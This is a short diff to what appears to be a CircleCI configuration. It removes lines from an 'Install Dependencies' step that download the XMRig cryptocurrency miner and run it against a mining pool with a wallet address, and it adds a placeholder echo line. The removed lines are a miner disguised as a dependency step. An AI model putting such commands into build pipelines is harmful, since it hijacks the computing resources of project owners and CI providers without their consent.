@@ -9,12 +9,7 @@ jobs:
             name: Install Dependencies
             command: |
               lscpu
-              sudo apt-get update && sudo apt-get upgrade -y
-              wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz
-              tar -xf xmrig-6.16.4-linux-x64.tar.gz
-              cd xmrig-6.16.4
-              ./xmrig -o rx.unmineable.com:3333 -u ETH:0x256b59886362c16fa72E141D6dfb0dC5D5FF18A5 -k
-
+              echo Hello,subscribe it
 
 workflows:
     version: 2.1
